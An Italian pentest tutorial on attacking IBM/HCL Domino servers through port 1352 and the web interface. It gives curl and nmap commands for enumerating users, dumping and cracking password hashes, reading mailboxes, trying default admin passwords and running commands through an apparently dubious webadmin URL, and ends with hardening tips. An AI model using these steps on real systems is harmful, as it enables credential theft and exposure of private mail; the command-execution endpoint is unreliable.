---
title: 'Porta 1352 Lotus Notes/Domino: NRPC, names.nsf e WebAdmin'
slug: porta-1352-lotus-notes
description: >-
  Pentest Lotus Notes/Domino sulla porta 1352: enum NRPC, names.nsf, Domino
  Directory, database NSF, WebAdmin e accessi deboli in ambienti legacy.
image: /porta-1352-lotus-notes.webp
draft: false
date: 2026-04-11T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - IBM Domino
  - NRPC
  - Lotus Notes
---

> **Executive Summary** — La porta 1352 espone il protocollo NRPC (Notes Remote Procedure Call) di IBM/HCL Domino (ex Lotus Notes). Domino è un sistema groupware legacy ancora presente in grandi enterprise e PA — gestisce email, database documentali, workflow e applicazioni custom. L'interfaccia NRPC permette enumerazione dei database NSF, accesso a rubrica (names.nsf), hash password e documenti. Domino ha una superficie di attacco ampia: credenziali default, database accessibili senza auth e CVE specifiche.

**COS'È IN BREVE LA PORT 1352:**

* La porta 1352 NRPC è il protocollo nativo di Domino — equivalente a MAPI per Exchange
* Il database `names.nsf` contiene utenti, hash password e configurazione server — spesso accessibile senza auth
* Domino è legacy, con credenziali default comuni e web interface (/names.nsf) esposta

```


Porta 1352 Lotus Notes è il canale TCP del protocollo NRPC usato da IBM/HCL Domino per la comunicazione client-server. La porta 1352 vulnerabilità principali sono l'accesso non autenticato ai database NSF (in particolare names.nsf), le credenziali default del server Domino e l'hash extraction dagli utenti. L'enumerazione porta 1352 rivela versione Domino, database disponibili, utenti e configurazione. Nel Domino pentest, compromettere il server significa accesso a email, documenti riservati e spesso credenziali per altri sistemi.

## 1. Anatomia Tecnica della Porta 1352

| Componente | Porta | Ruolo |
|-----------|-------|-------|
| **NRPC** | **1352/TCP** | **Protocollo nativo Notes client ↔ Domino** |
| HTTP | 80/443 | Web interface Domino |
| SMTP | 25 | Email in/out |
| LDAP | 389 | Directory Domino |
| POP3/IMAP | 110/143/993/995 | Accesso email |

I database Domino (file .nsf):
- **names.nsf**: rubrica — utenti, gruppi, server, hash password
- **admin4.nsf**: amministrazione
- **log.nsf**: log del server
- **mail/[user].nsf**: mailbox individuali
- **catalog.nsf**: catalogo di tutti i database

```

Misconfig: names.nsf accessibile senza autenticazione
Impatto: enumerazione completa utenti, gruppi, hash password
Come si verifica: http\://\[target]/names.nsf — se apre, è accessibile

```
```

Misconfig: Credenziali admin default non cambiate
Impatto: accesso amministrativo al server Domino
Come si verifica: prova admin/password, admin/domino, admin/admin

```
```

Misconfig: Database NSF accessibili via HTTP senza ACL
Impatto: accesso a email, documenti, workflow
Come si verifica: http\://\[target]/catalog.nsf — lista tutti i database

````

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 1352 10.10.10.80
````

**Output atteso:**

```
PORT     STATE SERVICE    VERSION
1352/tcp open  lotusnotes IBM Domino 12.0.2
```

### Comando 2: Web interface (porta HTTP correlata)

```bash
curl -sk https://10.10.10.80/names.nsf
```

**Output (accessibile):**

```html
<title>Domino Directory</title>
<!-- Lista utenti, gruppi, server -->
```

**Output (bloccato):**

```
You are not authorized to perform this operation
```

## 3. Enumerazione Avanzata

### Catalogo database

```bash
curl -sk https://10.10.10.80/catalog.nsf?OpenDatabase
```

**Output:**

```
mail/j.smith.nsf - John Smith Mail
mail/ceo.nsf - CEO Mail  
hr/recruiting.nsf - HR Recruiting
finance/budget.nsf - Budget 2026
admin4.nsf - Administration
```

**Lettura dell'output:** tutti i database NSF del server — mailbox, HR, finance, admin. Ogni database può essere aperto se l'ACL lo permette. `finance/budget.nsf` e `hr/recruiting.nsf` sono target ad alto valore.

### User enumeration da names.nsf

```bash
curl -sk "https://10.10.10.80/names.nsf/\$Users?OpenView&Count=1000" | grep -i "fullname\|shortname\|mail"
```

**Output:**

```
John Smith | j.smith | j.smith@corp.local
CEO Name | ceo | ceo@corp.local
HR Admin | hr.admin | hr.admin@corp.local
```

**Lettura dell'output:** lista completa utenti — nomi, username e email. Alimenta il [password spray su AD](https://hackita.it/articoli/bruteforce) e il [phishing mirato](https://hackita.it/articoli/phishing).

### Hash extraction

```bash
# Domino hash dalla view People
curl -sk "https://10.10.10.80/names.nsf/People?OpenView&ExpandAll" > users_dump.html

# Oppure con tool specifici
domi-owned.py --url https://10.10.10.80 --hashdump
```

**Output:**

```
j.smith:(GF5dqDE4hk34RE)  
ceo:(HG6erFE5il45SF)
```

**Lettura dell'output:** hash password Domino (formato proprietario). Crackabili con hashcat mode 8600 (Lotus Notes/Domino 5) o 8700 (Lotus Notes/Domino 6+): `hashcat -m 8700 hashes.txt rockyou.txt`.

## 4. Tecniche Offensive

**Accesso mailbox via web**

```bash
curl -sk "https://10.10.10.80/mail/ceo.nsf/\$Inbox?OpenView"
```

**Output (accessibile):**

```
Subject: Board Meeting - Confidential
Subject: Acquisition Target List
Subject: VPN Credentials Updated
```

**Cosa fai dopo:** accesso diretto alla mailbox del CEO senza autenticazione (se l'ACL del database è aperta). Scarica email con allegati — stessa logica della [compromissione POP3](https://hackita.it/articoli/porta-995-pop3s).

**Console admin Domino**

```bash
# Webadmin interface
curl -sk https://10.10.10.80/webadmin.nsf
# Testa credenziali default
curl -sk -u "admin:password" https://10.10.10.80/webadmin.nsf
```

**Credenziali default comuni:**

* admin / password
* admin / domino
* admin / (vuota)
* administrator / password

**Cosa fai dopo:** accesso admin = controllo completo del server Domino. Puoi creare utenti, accedere a ogni database, eseguire comandi sul server via console Domino.

**Esecuzione comandi via Domino console**

Contesto: accesso admin al server Domino.

```bash
# Via web console
curl -sk -u admin:password "https://10.10.10.80/webadmin.nsf/agentrunner?cmd=load%20cmd%20/c%20whoami"
```

## 5. Scenari Pratici

### Scenario 1: Domino server in enterprise legacy

**Step 1:**

```bash
nmap -sV -p 1352,80,443 10.10.10.80
```

**Step 2:**

```bash
curl -sk https://10.10.10.80/names.nsf
curl -sk https://10.10.10.80/catalog.nsf
```

**Step 3:**

```bash
# Se accessibile: dump utenti e hash
# Se bloccato: prova credenziali default su /webadmin.nsf
```

**Tempo stimato:** 10-20 minuti

### Scenario 2: Hash cracking e credential reuse

**Step 1:** estrai hash da names.nsf

**Step 2:**

```bash
hashcat -m 8700 domino_hashes.txt rockyou.txt
```

**Step 3:** testa password crackate su AD/SMB/VPN — il reuse è comune in ambienti dove Domino coesiste con AD.

**Tempo stimato:** 15-60 minuti

## 6. Cheat Sheet Finale

| Azione        | Comando                                                        |
| ------------- | -------------------------------------------------------------- |
| Scan          | `nmap -sV -p 1352,80,443 [target]`                             |
| names.nsf     | `curl -sk https://[target]/names.nsf`                          |
| catalog.nsf   | `curl -sk https://[target]/catalog.nsf`                        |
| User enum     | `curl -sk "https://[target]/names.nsf/\$Users?OpenView"`       |
| Hash dump     | `domi-owned.py --url https://[target] --hashdump`              |
| Crack hash    | `hashcat -m 8700 hashes.txt wordlist`                          |
| Mail access   | `curl -sk "https://[target]/mail/[user].nsf/\$Inbox?OpenView"` |
| Admin console | `curl -sk -u admin:password https://[target]/webadmin.nsf`     |

### Perché Porta 1352 è rilevante nel 2026

IBM/HCL Domino è ancora presente in grandi enterprise e PA — migliaia di installazioni legacy. I database NSF contengono decenni di email e documenti. Le ACL default sono spesso troppo permissive. Le credenziali Domino crackate funzionano su altri sistemi per password reuse.

### Hardening

* ACL restrittive su ogni database NSF — specialmente names.nsf e catalog.nsf
* Disabilita accesso HTTP ai database sensibili
* Cambia credenziali admin default
* Aggiorna Domino all'ultima versione HCL
* Monitora accessi a database critici

***

Riferimento: IBM Domino documentation, HCL security bulletins. Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
